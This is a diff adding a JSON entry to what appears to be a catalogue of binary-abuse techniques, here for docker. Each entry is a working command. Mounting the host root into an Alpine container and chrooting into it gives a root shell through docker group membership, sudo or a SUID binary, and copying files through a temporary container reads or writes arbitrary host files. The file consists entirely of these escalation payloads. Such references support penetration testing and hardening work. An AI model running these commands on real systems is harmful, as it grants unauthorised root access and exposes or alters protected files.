@@ -1,0 +1,35 @@
+{
+  "description": "This requires the user to be privileged enough to run docker, i.e. being in the 'docker' group or being 'root'. Any other Docker Linux image should work, e.g., 'debian'.",
+  "functions": {
+    "shell": [
+      {
+        "description": "The resulting is a root shell.",
+        "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "Write a file by copying it to a temporary container and back to the target destination on the host.",
+        "code": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF [file]\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "Read a file by copying it to a temporary container and back to a new location on the host.",
+        "code": "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "The resulting is a root shell.",
+        "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      }
+    ],
+    "suid": [
+      {
+        "description": "The resulting is a root shell.",
+        "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      }
+    ]
+  }
+}
